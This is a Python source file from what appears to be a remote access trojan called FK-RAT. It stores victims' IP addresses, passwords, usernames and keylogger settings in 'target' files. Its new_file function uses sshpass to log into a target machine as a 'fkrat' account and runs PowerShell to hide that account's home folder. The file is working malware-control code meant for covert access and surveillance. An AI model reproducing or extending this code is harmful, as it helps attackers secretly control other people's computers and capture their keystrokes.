import getpass
import os
import readline

from modules import payloads as pay

username = getpass.getuser()
header = f"{username}@FK-RAT"
github_path = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/"
local_path = f"/home/{username}/.FK-RAT" if username != "root" else "/root/.FK-RAT"


## Function for everything
def rlinput(prompt, prefill=''):
    readline.set_startup_hook(lambda: readline.insert_text(prefill))
    try:
        return input(prompt)  # or raw_input in Python 2
    finally:
        readline.set_startup_hook()


def rmWhiteSpace(var):
    output = ""
    for char in var:
        if char != " ":
            output += char
    return output



## Options
def edit_file(file):
    config = pay.read_config(file)
    username = rlinput("       Username   : ", config.get("USERNAME")).replace(" ", "")
    ip = rlinput("       Ip         : ", config.get("IPADDRESS")).replace(" ", "")
    password = rlinput("       Password   : ", config.get("PASSWORD")).replace(" ", "")
    tempDir = rlinput("       TempDir    : ", config.get("TEMPDIR")).replace(" ", "")
    try:
        keylogger = config.get("KEYLOGGER")
    except IndexError:
        keylogger = "Not set"

    target_file = open(f"{local_path}/targets/{file}", "w")
    target_file.write(f"{ip} \n{password} \n{username}\n{keylogger}\n{tempDir}")


def new_file():
    file_name = rmWhiteSpace(input(f"Filename   : "))
    username = rmWhiteSpace(input(f"Username   : "))
    ip = rmWhiteSpace(input(f"Ip         : "))
    password = rmWhiteSpace(input(f"Password   : "))
    tempDir = rmWhiteSpace(input(f"TempDir   : "))

    if not os.path.exists(f"{local_path}/targets"):
        os.mkdir(f"{local_path}/targets")
    target_file = open(f"{local_path}/targets/{file_name}.fk", "w")
    target_file.write(f"{ip} \n{password} \n{username}\nNot set\n{tempDir}")
    print("[..] Please wait while we configure everything (Shouldn't take longer that 10 seconds)")
    os.system(
        f"sshpass -p \"{password}\" ssh fkrat@{ip} -o StrictHostKeyChecking=accept-new " +
        " 'powershell attrib.exe +h C:/Users/fkrat'")


def delete_file(file):
    os.remove(f"{local_path}/targets/" + file)


def update():
    # TODO: add Update FK RAT
    print("This Function is not ready yet")


def remove():
    # TODO: add Uninstall / Remove FK RAT
    print("This Function is not ready yet")
